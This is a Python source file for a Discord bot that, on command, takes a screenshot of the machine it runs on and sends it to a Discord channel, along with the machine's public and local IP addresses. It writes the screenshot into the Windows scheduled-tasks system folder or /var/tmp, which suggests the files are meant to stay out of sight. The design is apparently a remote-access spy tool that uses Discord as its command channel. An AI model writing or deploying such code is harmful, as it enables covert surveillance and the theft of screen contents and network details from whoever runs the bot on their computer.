from dotenv import load_dotenv
import discord
from discord.ext import commands
import os
from PIL import ImageGrab
from platform import system
from requests import get
import socket

load_dotenv()

DISCORD_TOKEN = os.getenv("DISCORD_TOKEN")

intents = discord.Intents.default()
intents.message_content = True

bot = commands.Bot(command_prefix="!", intents=intents)

if system() == "Windows":
    isWindows = True
    path = "C:\\Windows\\System32\\Tasks\\"
elif system() == "Linux":
    isWindows = False
    path = "/var/tmp/"
else:
    exit()

def embed_data(title, description, data):
    embed = discord.Embed(
        title=title,
        color=discord.Color.green(),
        description=f"{description}\n```{data}```"
        )
    return embed

def get_public_ip():
    ip = get('https://api.ipify.org').content.decode('utf8')
    public_ip = format(ip)
    return public_ip

def get_local_ip():
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    s.connect(("8.8.8.8", 80))
    local_ip = s.getsockname()[0]
    s.close()
    return local_ip

def take_screenshot():
    global path
    image_path = path + "screenshot.png"

    screenshot = ImageGrab.grab()
    screenshot.save(image_path)
    screenshot.close()

    return image_path

@bot.command(name="screenshot")
async def screenshot(ctx):
    image_path = take_screenshot()
    await ctx.send(file=discord.File(image_path))

@bot.command(name="ip")
async def ip(ctx):
    public_ip = get_public_ip()
    local_ip = get_local_ip()

    embed = discord.Embed(
        title="IP addresses",
        color=discord.Color.green()
    )
    embed.add_field(
        name="Public IP",
        value=f"`{public_ip}`",
        inline=False
    )
    embed.add_field(
        name="Local IP",
        value=f"`{local_ip}`",
        inline=False
    )

    await ctx.send(embed=embed)

bot.run(DISCORD_TOKEN)